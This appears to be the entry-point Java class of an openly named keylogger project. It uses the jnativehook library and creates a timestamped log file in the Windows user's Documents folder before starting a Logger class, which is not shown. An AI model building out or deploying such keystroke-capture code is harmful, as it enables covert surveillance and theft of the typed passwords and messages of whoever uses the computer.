package com.github.keylogger;

import java.awt.AWTException;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Date;
import org.jnativehook.NativeHookException;

public class Main {

    public static void main(String[] args) throws NativeHookException, AWTException, IOException {
        File file = Files.createFile(Paths.get("C:/Users/" + System.getProperty("user.name") + "/Documents/" + new Date().getTime() + ".txt")).toFile();
        
        Logger logger = new Logger(file);
        logger.run();
    }

}
